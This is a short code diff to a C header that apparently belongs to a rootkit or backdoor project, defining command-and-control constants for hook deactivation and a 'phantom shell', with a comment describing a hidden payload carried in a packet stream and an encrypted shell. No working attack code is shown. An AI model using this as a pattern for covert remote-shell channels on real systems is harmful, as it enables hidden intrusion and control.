@@ -28,7 +28,7 @@
 #define CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL 2
 #define CC_PROT_COMMAND_PHANTOM_SHELL 3
 
-#define CC_PROT_PHANTOM_COMMAND_LIST_HOOKS 0
+#define CC_PROT_PHANTOM_SHELL_INIT "CC_PHANTOM_INIT"
 
 //C&C V3 -- Distributed hidden payload in packet stream + encrypted shell
 struct trigger_32_t {
